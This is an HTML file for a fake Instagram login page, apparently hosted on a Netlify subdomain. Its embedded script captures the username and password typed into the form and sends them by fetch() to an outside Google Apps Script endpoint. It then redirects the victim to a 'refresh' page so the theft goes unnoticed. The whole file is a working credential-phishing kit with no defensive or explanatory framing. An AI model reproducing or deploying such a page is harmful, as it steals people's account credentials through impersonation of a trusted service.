<!DOCTYPE html>
<html lang="en">

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login â€¢ Instagram</title>
  <link rel="icon" href="instagram-logo-png.png">
  <link rel="stylesheet" href="styles.css">
</head> 
<body><!--website name  :- instagrammy.netlify.app -->
  <div class="container">
    <div class="login-box">
      <img src="ig.png" alt="Instagram Logo" class="logo">
      <h2>Log in to Instagram</h2>
      <form class="login-form" action='' method="POST" id="form">
        <div class="form-group">
          <input type="text" id="username" name="username" placeholder="Username or Email" required>
        </div>
        <div class="form-group">
          <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit">Log In</button>
      </form>
      <div class="forgot-password">
        <a href="#">Forgot password?</a>
      </div>
      <div class="signup-link">
        <span>Don't have an account?</span>
        <a href="#">Sign up</a>
      </div>
    </div>
  </div>

  <script>
    let url = 'https://script.google.com/macros/s/AKfycbziCMtPbTnIB6k504sDBHuRe4RWRZ6CZf4wT8hIQYluQIfwHkXiXA2N6QOPrH4vphoZug/exec';
    let form = document.querySelector('#form');
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        let d = new FormData(form);
        fetch(url, {
            method: "POST",
            body: d
        }).then((res) => res.text())
        .then((finalRes) => {
            console.log(finalRes);
            window.location.href = 'refresh.html';
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    });
  </script>
</body>
